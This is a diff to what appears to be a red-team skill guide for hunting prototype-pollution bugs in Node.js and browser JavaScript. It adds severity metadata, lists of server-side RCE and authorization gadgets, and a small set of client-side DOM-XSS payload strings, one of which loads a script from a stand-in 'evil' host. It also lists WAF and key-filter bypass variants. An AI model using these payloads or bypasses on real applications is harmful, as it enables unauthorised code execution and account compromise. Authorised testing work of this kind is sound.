@@ -6,6 +6,8 @@ author: uphiago
 license: MIT
 platforms: [linux]
 compatibility: Requires curl, jq, node
+cwe: [CWE-1321, CWE-915, CWE-94, CWE-79]
+cvss_baseline: "Medium (6.1) pollution with no reached sink → High (7.5-8.1) DOM-XSS gadget or authz-default override → Critical (9.8) server-side pollution reaching a child_process/RCE gadget."
 metadata:
   tags: [prototype-pollution, nodejs, javascript, express, dom]
   category: redteam
@@ -271,6 +273,26 @@ To avoid reporting false positives during triage, verify findings against this c
 | **Application crashes / 500 error** | Prototype Corruption (DoS) | Polluting native methods (`toString`, `valueOf`) causes application-wide crashes. This is a denial-of-service failure, not proof of code execution. Always use unique custom strings. |
 
 ---
+
+## New Techniques / Gadgets (2024-2026)
+
+### Server-side (SSPP) sink gadgets — pollution alone is only half
+Confirm the sink, OOB where possible:
+- **`child_process`** via polluted `options.shell`/`env`/`NODE_OPTIONS=--require=/proc/self/...`, `execArgv` → RCE.
+- **Template engines**: EJS `opts.outputFunctionName`/`escapeFunction`, Pug/Handlebars compile options, lodash `_.template` (CVE-2021-23337).
+- **Auth/logic defaults**: polluting `isAdmin`/`role`/`authenticated` defaults so a later `obj.x ?? proto.x` reads `true`.
+- Vulnerable mergers: `lodash.merge/defaultsDeep` (pre-patch), `set-value`, `unflatten`, `deep-extend`, `mixin-deep`, `qs`/`express` query parsing, `node-config`.
+
+### Client-side (CSPP) → DOM-XSS gadget registry
+```
+?__proto__[srcdoc]=<img src onerror=alert(1)>          # sanitizer/iframe gadget
+?__proto__[src]=//evil/x.js                             # script-src gadget (many SPA loaders)
+#constructor[prototype][innerHTML]=<img src onerror=alert(1)>
+```
+Known gadget libs: older jQuery, Google Closure, Wistia, Adobe DTM/Launch, Segment, various analytics loaders. **DOM-Invader → "prototype pollution"** auto-finds source→gadget. Cross-ref `hunt-dom`, `hunt-xss`.
+
+### WAF / key-filter bypass
+`constructor.prototype` when `__proto__` is filtered; `__proto__` via array/dotted/bracket notation (`a[__proto__][x]`, `a.__proto__.x`); Unicode/encoded key variants; JSON vs query-string parser differences. Confirm pollution persists to a *subsequent* request (server-side) before claiming impact.
 
 ## Verification
 
